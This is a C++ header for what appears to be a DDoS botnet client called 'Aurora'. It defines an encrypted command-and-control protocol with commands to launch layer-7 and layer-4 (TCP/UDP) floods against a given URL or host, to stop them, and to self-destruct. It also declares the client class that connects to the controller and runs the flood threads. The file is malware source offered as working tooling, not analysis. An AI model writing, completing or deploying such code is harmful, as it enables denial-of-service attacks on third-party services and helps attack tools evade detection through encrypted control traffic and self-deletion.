#pragma once

#ifndef APP_H
#define APP_H

#include "Common.h"
#include "Convert.hpp"
#include "Encodings.h"
#include "Base64.hpp"

#include <boost/asio.hpp>   
#include <mutex>
#include <random>


namespace asio = boost::asio;            // from <boost/asio.hpp>
namespace ip = boost::asio::ip;
using tcp = ip::tcp;
using udp = ip::udp;

#ifndef DDOS_PORT
#define DDOS_PORT 15666
#endif

#ifndef DDOS_HOST
#define DDOS_HOST "127.0.0.1"
#endif

#define AURORA_VERSION 1

enum class Action : uint64_t {
    CLIENT_SERVER_HELLO = 0,
    L7_DDOS = 1,
    L4_DDOS = 2,
    STOP_DDOS = 3,
    SELF_DESTRUCT = 4
};
MSGPACK_ADD_ENUM(Action);

typedef struct _ClientSession {
    LibsodiumKey pk;
    LibsodiumKey sk;
    LibsodiumKey rx;
    LibsodiumKey tx;
    LibsodiumKey server_pk;
} ClientSession, * PClientSession;

typedef struct _ClientHello {
    Action action = Action::CLIENT_SERVER_HELLO;
    LibsodiumKey pk;
    array<uint8_t, 128> ad;
    uint64_t version;
    MSGPACK_DEFINE(pk, ad, version);
} ClientHello, * PClientHello;

typedef struct _ServerHello {
    Action action = Action::CLIENT_SERVER_HELLO;
    LibsodiumKey pk;
    array<uint8_t, 128 + crypto_aead_xchacha20poly1305_ietf_ABYTES + crypto_aead_xchacha20poly1305_ietf_NPUBBYTES> ad;
    MSGPACK_DEFINE(pk, ad);
} ServerHello, * PServerHello;

typedef struct _StartDDoS {
    Action action;
    string urlOrHost;
    uint32_t threads_count;
    optional<uint16_t> port;
    optional<bool> udp;
    MSGPACK_DEFINE(action, urlOrHost, port, udp);
} StartDDoS, * PStartDDoS;

typedef shared_ptr<tcp::socket> socket_ptr;

class Application  {
private:
    string mHost;
    uint16_t mPort;
    asio::io_context ioc;
    asio::io_service io_service;
    ip::tcp::endpoint endpoint;
    ClientSession session{};
    std::mutex mx;
    socket_ptr socket;
    bool ddosStopped = false;
public:

    Application(
        string host, 
        uint16_t port = DDOS_PORT
    ) : mHost(std::move(host)), mPort(port) {
        this->socket = std::make_shared<tcp::socket>(tcp::socket(this->io_service));
    }

    ~Application() {
        this->io_service.stop();
        if (this->socket && this->socket->is_open()) this->socket->close();
    }

    void run();

    bool clientHello(boost::system::error_code& ec);

    uint16_t getPort() const noexcept { return this->mPort; }
    const string& getHost() const noexcept { return this->mHost; }

    size_t sendMessage(const uint8_t* data, const size_t dataSize);
    size_t sendMessage(const byte_array& msg);
    size_t sendMessage(const msgpack::sbuffer& msg);
    size_t sendMessage(const string& msg);

    bool reconnect();

    template <typename PackT> size_t packAndSend(const PackT& packet) {
        crypt::XChaCha20Poly1305 cipher(this->session.tx);
        msgpack::sbuffer packed;
        msgpack::pack(packed, packet);
        const auto crypted = cipher.encrypt(packed);
        if (!crypted) return 0;
        const optional<string> compressed = encodings::compress(crypted.value());
        if (!compressed) return 0;
        return this->sendMessage(compressed.value());
    }
    template <typename UnpackT> optional<UnpackT> recv(
        const asio::streambuf& data,
        byte_array* raw = nullptr
    ) {
        crypt::XChaCha20Poly1305 cipher(this->session.rx);
        const string decoded = base64_decode(asio::buffer_cast<const char*>(data.data()), data.size() - SOCKET_DELIMITER.size());
        const optional<string> uncompressed = encodings::decompress(decoded);
        if (!uncompressed) return nullopt;
        const auto dec_data = cipher.decrypt(uncompressed.value());
        if (!dec_data) return nullopt;
        if (raw) *raw = dec_data.value();
        try {
            return msgpack::unpackt<UnpackT>(dec_data.value());
        }
        catch (const msgpack::unpack_error& ex) {
            return nullopt;
        }
    }

    void DdosThreadL7(string url);
    void DdosThreadL4(string host, const uint16_t port, optional<bool> udp);

    const ClientSession& getSession() const { return this->session; }

    [[noreturn]] void SelfDesctruct();
};

namespace os {
    wstring getExecutePathW();
}

namespace random {
    template<typename Iter, typename RandomGenerator> Iter select_randomly(Iter start, Iter end, RandomGenerator& g) {
        std::uniform_int_distribution<> dis(0, std::distance(start, end) - 1);
        std::advance(start, dis(g));
        return start;
    }

    template<typename Iter> Iter select_randomly(Iter start, Iter end) {
        std::random_device rd;
        std::mt19937 gen(rd());
        return random::select_randomly(start, end, gen);
    }

    template <typename VectorT> VectorT select_randomly(const vector<VectorT>& vector) {
        return *random::select_randomly(vector.begin(), vector.end());
    }

}

#endif